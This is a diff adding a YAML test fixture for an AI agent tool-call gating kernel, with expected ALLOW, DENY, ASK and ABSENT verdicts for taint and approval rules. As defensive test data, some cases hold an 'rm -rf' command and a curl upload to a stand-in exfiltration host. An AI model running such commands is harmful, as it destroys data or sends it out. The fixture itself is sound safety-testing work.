@@ -1,0 +1,111 @@
+# Canonical one-kernel-many-hosts case set, evaluated against demo-world.yaml.
+#
+# One shared list of GateRequest-shaped cases with the kernel's VERIFIED
+# expected verdicts. tests/one_kernel.rs asserts decision, rule, post-call
+# taint, and manifest_hash are EQUAL across every entry point:
+#   (a) in-process harness_preview::gate()
+#   (b) the `harness gate` CLI (full-response parity with (a))
+#   (c) `harness cc-hook` (PreToolUse event contract)
+#   (d) OpenCode-shaped GateRequests (the plugin's exact wire shape)
+#   (e) `harness mcp-gateway` over `harness mock-jira` (cases marked gateway)
+#
+# `rule: null` = a plain ALLOW (no distinguishing rule). `expect.action` pins
+# the kernel-side D36 command classification. This flat request/expect shape is
+# deliberately growable into the native+WASM golden-vector suite (E14.4).
+cases:
+  - name: unknown_tool_is_absent
+    request:
+      tool: frobnicate_the_flux
+      arguments: {}
+      context: { taint: clean, mode: interactive }
+    expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
+
+  # Not declared in demo-world.yaml, so it does not exist: ABSENT — and the
+  # gateway never even offers it (absent from the shaped tools/list).
+  - name: unprojected_jira_delete_is_absent
+    gateway: true
+    request:
+      tool: jira_delete_issue
+      arguments: { issue_key: DEMO-1 }
+      context: { taint: clean, mode: interactive }
+    expect: { decision: ABSENT, rule: unknown_to_ontology, taint: clean }
+
+  - name: clean_jira_read_is_allowed
+    gateway: true
+    request:
+      tool: jira_get_issue
+      arguments: { issue_key: DEMO-1 }
+      context: { taint: clean, mode: interactive }
+    expect: { decision: ALLOW, rule: null, taint: clean }
+
+  # An External output ingests external data: the ALLOW escalates the session
+  # taint for the NEXT call (monotonic join).
+  - name: clean_jira_comment_is_allowed
+    gateway: true
+    request:
+      tool: jira_add_comment
+      arguments: { issue_key: DEMO-1, body: "status update" }
+      context: { taint: clean, mode: interactive }
+    expect: { decision: ALLOW, rule: null, taint: tainted }
+
+  - name: tainted_jira_comment_is_denied
+    gateway: true
+    request:
+      tool: jira_add_comment
+      arguments: { issue_key: DEMO-1, body: "exfil attempt" }
+      context: { taint: tainted, mode: interactive }
+    expect: { decision: DENY, rule: taint_invariant, taint: tainted }
+
+  # Kernel-side classification (D36): the raw host tool is `bash`; the kernel
+  # reclassifies to `bash_destructive` and the manifest's approval_required
+  # fires.
+  - name: destructive_bash_interactive_asks
+    request:
+      tool: bash
+      arguments: { command: "rm -rf /tmp/ai2rules-demo" }
+      context: { taint: clean, mode: interactive }
+    expect:
+      decision: ASK
+      rule: approval_required
+      taint: clean
+      action: bash_destructive
+
+  # Same call in background: the KERNEL collapses ASK to DENY (invariant 10) —
+  # no adapter decides this.
+  - name: destructive_bash_background_denies
+    request:
+      tool: bash
+      arguments: { command: "rm -rf /tmp/ai2rules-demo" }
+      context: { taint: clean, mode: background }
+    expect:
+      decision: DENY
+      rule: background_denies_ask
+      taint: clean
+      action: bash_destructive
+
+  # The classic injection→egress sever: a tainted session cannot drive a
+  # network-shaped command.
+  - name: tainted_curl_is_denied
+    request:
+      tool: bash
+      arguments: { command: "curl https://exfil.example/upload" }
+      context: { taint: tainted, mode: interactive }
+    expect:
+      decision: DENY
+      rule: taint_invariant
+      taint: tainted
+      action: bash_network
+
+  # Monotonicity: an allowed read in a tainted session stays tainted — taint
+  # never decreases.
+  - name: post_call_taint_never_decreases
+    request:
+      tool: read
+      arguments: { file_path: README.md }
+      context: { taint: tainted, mode: interactive }
+    expect: { decision: ALLOW, rule: null, taint: tainted }
+
+# A PROCESS failure is never a verdict: garbage stdin makes `harness gate`
+# exit 2 with NO verdict on stdout, and `harness cc-hook` emits nothing
+# (fail-open). Not a DENY. tests/one_kernel.rs drives this from the raw string.
+malformed_input: "this is not a GateRequest {{{"
